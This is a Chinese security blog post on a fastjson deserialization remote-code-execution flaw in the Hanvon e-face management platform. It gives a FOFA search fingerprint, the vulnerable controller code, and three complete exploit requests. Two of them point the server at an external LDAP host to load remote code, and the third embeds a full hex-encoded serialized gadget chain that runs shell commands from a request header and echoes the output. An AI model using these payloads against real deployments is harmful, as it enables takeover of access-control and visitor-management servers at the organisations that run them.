---
title: "汉王e脸通综合管理平台 addVisitDeviceAppointmentInfoTest.do fastjson反序列化RCE漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-addVisitDeviceAppointmentInfoTest-fastjson-rce.html
asset_dir: assets/汉王e脸通综合管理平台-addvisitdeviceappointmentinfotest.do-fastjson反序列化rce漏洞
---

# 汉王e脸通综合管理平台 addVisitDeviceAppointmentInfoTest.do fastjson反序列化RCE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/8 08:38
* 1562浏览
* [0评论](#comment)
* 2小时阅读

深入探索

SQL

安全

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `addVisitDeviceAppointmentInfoTest.do` 接口存在 fastjson 反序列化[远程命令执行漏洞](https://mrxn.net/tag/rce)。攻击者通过向该接口提交特制的 JSON 数据，利用 fastjson [反序列化](https://mrxn.net/?keyword=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)缺陷，实现任意命令执行，进而获取系统控制权限，影响范围包括平台服务器的完整性与可用性。

漏洞修复方案

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357”

# 漏洞分析

深入探索

授权

Authorization

计算机安全

先看下系统依赖的 fastjson 版本 1.2.46

[![汉王e脸通综合管理平台 addVisitDeviceAppointmentInfoTest.do fastjson反序列化RCE漏洞](images/img-001-aedfa068445f.webp)](https://image.mrxn.net/0294e335033f4612b624ec8670fcd5c9.webp)

再看 `VisitorDeviceInteractionController` 里关于 `addVisitDeviceAppointmentInfoTest.do` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/addVisitDeviceAppointmentInfoTest.do"},
        method = {RequestMethod.POST}
    )
    public DataPackage addAppointment(HttpServletRequest request) {
        RenZhengCommandTpm command = null;

        try {
            String json = this.httpReq2JSON(request);
            command = (RenZhengCommandTpm)JSONObject.toBean(JSONObject.fromObject(JSON.parseObject(json)), RenZhengCommandTpm.class);
        } catch (Exception var7) {
            logger.error("解析命令失败：");
        }

        new RequestJson();
        RenZhengCommandTpm cmd = new RenZhengCommandTpm();
        cmd.setRETURN(command.getCOMMAND());
        RenZhengParamTpm outParam = new RenZhengParamTpm();
        cmd.setPARAM(outParam);
```

深入探索

云安全解决方案

恶意软件分析工具

网络安全课程

将用户可控的 json 内容直接使用 [fastjson](https://mrxn.net/?keyword=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96) 的 parseObject 来进行反序列化操作，而系统依赖的 1.2.46 版本又存在[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，因此造成了反序列化[RCE](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

> 使用 Java-chians 来进行测试
>
> 物流软件安全

## 命令执行（ldap）

[![汉王e脸通综合管理平台 addVisitDeviceAppointmentInfoTest.do fastjson反序列化RCE漏洞](images/img-002-f1012430ab9f.webp)](https://image.mrxn.net/f6df4a5187384ad99cbfa05335284b1f.webp)

```
POST /manage/visitorDeviceInteraction/addVisitDeviceAppointmentInfoTest.do?recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: application/json

{
  "isNeedMeetingPermission": "true",
  "COMMAND": "AddAppointment",
  "PARAM": {

  },
  "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://192.168.11.23:50389/e9df7a",
        "autoCommit":true
    }
}
```

[![汉王e脸通综合管理平台 addVisitDeviceAppointmentInfoTest.do fastjson反序列化RCE漏洞](images/img-003-bbbef582f216.webp)](https://image.mrxn.net/d54832b153054347990c76c93bbc279c.webp)

服务器上成功执行命令 弹出计算器！

Windows安全工具

[![汉王e脸通综合管理平台 addVisitDeviceAppointmentInfoTest.do fastjson反序列化RCE漏洞](images/img-004-43b111a4b0f5.webp)](https://image.mrxn.net/2846d116cd624247a172c8262e0172cb.webp)

## 命令执行回显（ldap）

```
POST /manage/visitorDeviceInteraction/addVisitDeviceAppointmentInfoTest.do?recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
X-Authorization: whoami
Content-Type: application/json

{
  "isNeedMeetingPermission": "true",
  "COMMAND": "AddAppointment",
  "PARAM": {

  },
  "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://192.168.11.23:50389/56f8f8",
        "autoCommit":true
    }
}
```

[![汉王e脸通综合管理平台 addVisitDeviceAppointmentInfoTest.do fastjson反序列化RCE漏洞](images/img-005-02ccbc9b924c.webp)](https://image.mrxn.net/1d9b60aec21d421fb134360edcf09781.webp)

执行 `whoami` 命令成功回显

漏洞修复方案

## 命令执行回显（无ldap）

```
POST /manage/visitorDeviceInteraction/addVisitDeviceAppointmentInfoTest.do?recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
cmd: whoami
Content-Type: application/json

{"e":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"f":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;"}}
```

[![汉王e脸通综合管理平台 addVisitDeviceAppointmentInfoTest.do fastjson反序列化RCE漏洞](images/img-006-4fb4d29c8673.webp)](https://image.mrxn.net/9cb42cb5f6cc4eff9cd5311d45864fe0.webp)

成功[执行命令](https://mrxn.net/tag/rce) `whoami` 并回显结果

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.命令执行（ldap）](#toc-5-1-)
* [5.2.命令执行回显（ldap）](#toc-5-2-)
* [5.3.命令执行回显（无ldap）](#toc-5-3-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 addVisitDeviceAppointmentInfoTest.do fastjson反序列化RCE漏洞](https://mrxn.net/jswz/hanvon-efacego-addVisitDeviceAppointmentInfoTest-fastjson-rce.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-addVisitDeviceAppointmentInfoTest-fastjson-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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